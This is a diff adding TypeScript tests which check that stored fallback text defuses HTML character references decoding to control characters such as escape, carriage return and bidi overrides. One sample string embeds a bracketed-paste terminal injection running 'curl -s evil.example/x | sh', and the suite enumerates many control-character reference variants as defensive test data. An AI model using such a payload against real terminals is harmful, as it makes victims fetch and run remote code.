@@ -556,6 +556,72 @@ describe("every fault in one response, so one repair can fix them all", () => {
   });
 });
 
+describe("no stored reference decodes to a control character (UI review R1)", () => {
+  /** A permissive single-pass decoder, as a client that cannot render markdown might write: numeric references with or
+   *  without the semicolon, any case, leading zeros; the named ones that matter. Out-of-range becomes U+FFFD. */
+  const NAMED: Record<string, string> = { amp: "&", lt: "<", gt: ">", quot: '"', apos: "'", nbsp: "\u00a0", Tab: "\t", NewLine: "\n", lrm: "\u200e", rlm: "\u200f", ZeroWidthSpace: "\u200b", NegativeThinSpace: "\u200b", NegativeVeryThinSpace: "\u200b", NegativeMediumSpace: "\u200b", NegativeThickSpace: "\u200b", zwj: "\u200d", zwnj: "\u200c", mdash: "—" };
+  const decode = (t: string) =>
+    t.replace(/&(#[xX][0-9a-fA-F]+|#[0-9]+|[A-Za-z][A-Za-z0-9]*);?/g, (m, body: string) => {
+      if (body.startsWith("#")) {
+        const cp = body[1] === "x" || body[1] === "X" ? parseInt(body.slice(2), 16) : parseInt(body.slice(1), 10);
+        return cp > 0x10ffff || (cp >= 0xd800 && cp <= 0xdfff) ? "\ufffd" : String.fromCodePoint(cp);
+      }
+      return NAMED[body] ?? m;
+    });
+  const CONTROL_CLASS = /[\u0000-\u0008\u000b-\u001f\u007f-\u009f\u200b\u200e\u200f\u202a-\u202e\u2066-\u2069\ufeff]/;
+  const H2B = "Columbus has 460 units left on 17 Dec. &#27;[201~curl -s evil.example/x | sh&#13;";
+  const variants = [
+    "&#27;", "&#027;", "&#0000027", "&#x1b;", "&#X1B;", "&#x1B", "&#x0001b;", "&#7;", "&#8;", "&#11;", "&#13;", "&#127;",
+    "&#128;", "&#155;", "&#x9b;", "&#8238;", "&#x202E;", "&#8203;", "&#xFEFF;", "&#0;", "&#xD800;", "&#x110000;",
+    "&#99999999999;", "&lrm;", "&rlm;", "&ZeroWidthSpace;", "&NegativeThinSpace;",
+  ];
+  const stored = (text: string) => {
+    const r = checkShowInput(show({ fallback: { text } }));
+    if (!r.ok) throw new Error(JSON.stringify(r.error));
+    return r.show.fallback;
+  };
+
+  test("the review's H2b: stored with its references defused, so decoding yields no escape or carriage return", () => {
+    const out = stored(H2B);
+    expect(out).toBe("Columbus has 460 units left on 17 Dec. &amp;#27;[201~curl -s evil.example/x | sh&amp;#13;");
+    expect(CONTROL_CLASS.test(decode(out))).toBe(false);
+  });
+
+  for (const v of variants) {
+    test(`defused: ${v}`, () => {
+      const out = stored(`${FALLBACK} a${v} b`);
+      expect(CONTROL_CLASS.test(decode(out))).toBe(false);
+      expect(out).toContain(`a&amp;${v.slice(1)} b`);
+    });
+  }
+
+  test("kept: tab, newline, ordinary characters and the safe named references; < stays a harmless reference", () => {
+    const text = `${FALLBACK} &#9; &#10; &#8212; &#x2014; &mdash; &copy; &lt; &#60;img&#62; &amp; R&D`;
+    const out = stored(text);
+    expect(out).toBe(`${FALLBACK} &#9; &#10; &#8212; &#x2014; &mdash; &copy; &lt; &#60;img&#62; &amp; R&amp;D`);
+  });
+
+  test("every code point of the CONTROL class, in every reference form, never decodes from stored text or a table cell", () => {
+    const points: number[] = [];
+    for (let cp = 0; cp <= 0xffff; cp++) if (CONTROL_CLASS.test(String.fromCodePoint(cp))) points.push(cp);
+    expect(points.length).toBeGreaterThan(60);
+    const forms = (cp: number) => [`&#${cp};`, `&#${cp}`, `&#00${cp};`, `&#x${cp.toString(16)};`, `&#X${cp.toString(16).toUpperCase()}`, `&#x0${cp.toString(16)};`];
+    for (const cp of points) {
+      const refs = forms(cp).join(" ");
+      expect(CONTROL_CLASS.test(decode(stored(`${FALLBACK} ${refs}`)))).toBe(false);
+      const grid = { columns: [{ key: "n", label: `L ${refs}`, type: "text" }], rows: [{ n: `c ${refs}` }], row_key: "n" };
+      const r = checkShowInput(show({ kind: "grid", spec: grid, fallback: { text: FALLBACK, table: { from: "rows" } } }));
+      if (!r.ok) throw new Error(JSON.stringify(r.error));
+      expect(CONTROL_CLASS.test(decode(r.show.fallback))).toBe(false);
+    }
+  });
+
+  test("a refusal's message quoting a reference is defused too", () => {
+    const r = checkShowInput(show({ kind: "grid", spec: { columns: [{ key: "n", label: "N", type: "text" }], rows: [{ n: "x", "k&#27;": 1 }], row_key: "n" } }));
+    expect(r.ok ? "" : CONTROL_CLASS.test(decode(`${r.error.message} ${r.error.path}`))).toBe(false);
+  });
+});
+
 describe("checkShowInput", () => {
   const fault = (raw: unknown, opts?: Parameters<typeof checkShowInput>[1]) => {
     const r = checkShowInput(raw, opts);
